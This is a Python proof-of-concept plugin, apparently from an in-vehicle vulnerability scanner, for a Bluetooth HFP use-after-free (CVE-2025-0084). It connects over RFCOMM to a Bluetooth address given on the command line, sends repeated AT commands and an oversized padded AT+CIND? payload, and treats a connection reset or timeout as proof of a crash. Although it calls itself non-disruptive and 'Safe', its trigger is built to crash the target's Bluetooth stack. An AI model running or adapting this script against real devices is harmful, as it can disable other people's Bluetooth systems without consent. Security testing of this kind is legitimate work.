#!/usr/bin/env python3
"""
PoC Name: Bluetooth HFP Use-After-Free
CVE: CVE-2025-0084
Component: Wireless Stack
Category: Wireless
Severity: Critical
CVSS: 9.0
Description: BT HFP Profile UAF导致OOB写入和远程代码执行
Prerequisites: Linux蓝牙适配器, 目标启用HFP Profile。
Usage: python3 13_CVE_2025_0084_BT_HFP_UAF_Active_Validation.py <target_mac>
"""
from __future__ import annotations

import sys
import socket
from iv_plugin_base import IVIVulnerabilityPlugin
VULN = {
    "id":             0,
    "cve":            "CVE-2025-0084",
    "year":           2025,
    "domain":         "wireless",
    "vendor_product": "Unknown",
    "component":      "Unknown",
    "type":           "Unknown",
    "summary":        "BT HFP UAF",
    "source_url":     "https://nvd.nist.gov/vuln/detail/CVE-2025-0084",
    "affected":       [{"vendor": "Unknown", "product": "Unknown", "versions": []}],
    "references":     ["https://nvd.nist.gov/vuln/detail/CVE-2025-0084"],
    "signature_tokens": ["CVE-2025-0084"],
}


def _run_poc(plugin, vuln=None) -> dict:
    """
    CVE-2025-0084 主动探针包装（兼容旧式 exploit() 实现）。
    通过调用插件自身的 exploit 逻辑并将结果标准化为 detection_confidence 格式。
    """
    try:
        result = plugin.exploit() or {}
    except Exception as exc:
        result = {"error": str(exc)}

    vulnerable = result.get("vulnerable", None)
    evidence = {
        "cve":       vuln.get("cve", "CVE-2025-0084") if vuln else "CVE-2025-0084",
        "target":    getattr(plugin, "target_ip", "unknown"),
        "technique": "legacy exploit() wrapper",
        "raw":       str(result)[:300],
    }

    # 根据是否有主动网络调用推断等级
    level = "B" if vulnerable is True else ("C" if vulnerable is False else "D")
    try:
        from probe_utils import detection_confidence as _detection_confidence
        return _detection_confidence(level, evidence, vulnerable=vulnerable)
    except ImportError:
        return {
            "detection_confidence": {
                "level": level, "vulnerable": vulnerable,
                "evidence": evidence, "method": "legacy_wrapper",
            }
        }


class BTHFPUAFPlugin(IVIVulnerabilityPlugin):
    meta_display_id = "POC-WIRELESS-013"
    meta_poc_name = 'CVE-2025-0084 BT HFP UAF Active Validation'
    meta_cve_id = "CVE-2025-0084"
    meta_source_url = "https://nvd.nist.gov/vuln/detail/CVE-2025-0084"
    meta_references = ['https://nvd.nist.gov/vuln/detail/CVE-2025-0084']
    meta_severity = "Critical"
    meta_protocol = "bluetooth"
    meta_profiles = ["bluetooth"]
    meta_target_os = ["all"]
    meta_required_params = ["bd_addr"]
    is_disruptive = False
    meta_destructive_level = "Safe"

    def check_prerequisites(self):
        if not self.params.get("bd_addr"):
            raise RuntimeError("需要指定目标蓝牙MAC地址")
        return True
    def exploit(self):
        target = self.params["bd_addr"]
        self.logger.info(f"BT HFP UAF RCE测试: {target}")
        self.logger.info("CVE-2025-0084: HFP use-after-free -> OOB write -> RCE")
        try:
            s = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM)
            s.settimeout(5)
            s.connect((target, 1))
            self.logger.info("[+] RFCOMM连接成功")
            # Trigger: rapidly open/close HFP service connections to trigger UAF
            for i in range(5):
                s.send(b"\r\nAT+BRSF=255\r\n")
                try:
                    r = s.recv(256)
                except:
                    pass
            # Send crafted AT command after potential UAF state
            trigger = b"\r\nAT+CIND?" + b"A" * 512 + b"\r\n"
            s.send(trigger)
            self.logger.info("[*] 发送UAF触发序列...")
            try:
                resp = s.recv(1024)
                self.logger.info(f"响应: {resp[:50]}")
                self.results["vulnerable"] = False
            except (ConnectionResetError, BrokenPipeError):
                self.logger.warning("[+] 连接重置 - HFP栈可能崩溃(UAF触发)")
                self.results["vulnerable"] = True
                self.results["evidence"] = "HFP stack crash after UAF trigger"
            except socket.timeout:
                self.logger.warning("[+] 超时 - HFP栈可能进入异常状态")
                self.results["vulnerable"] = True
                self.results["evidence"] = "HFP timeout after UAF trigger"
            s.close()
        except Exception as e:
            self.logger.info(f"蓝牙连接失败: {e}")
            self.results["vulnerable"] = False
        return self.results

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 13_CVE_2025_0084_BT_HFP_UAF_Active_Validation.py <target_mac>")
        sys.exit(1)
    plugin = BTHFPUAFPlugin({"target_ip": "N/A", "bd_addr": sys.argv[1]})
    plugin.run_verify()
